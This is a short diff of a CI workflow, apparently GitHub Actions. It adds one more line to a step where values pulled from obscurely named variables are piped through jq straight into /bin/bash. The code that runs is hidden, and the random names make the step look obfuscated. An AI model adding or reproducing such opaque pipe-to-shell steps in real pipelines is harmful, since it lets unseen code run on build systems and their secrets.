@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$ma0" | jq -r .axwdd250 | /bin/bash
           echo $h2 | jq -r .w05 | /bin/bash
           printf '%s' "$xiuu99" | jq -r .lkqtn742 | /bin/bash
+          echo $y095 | jq -r .ftbzu318 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
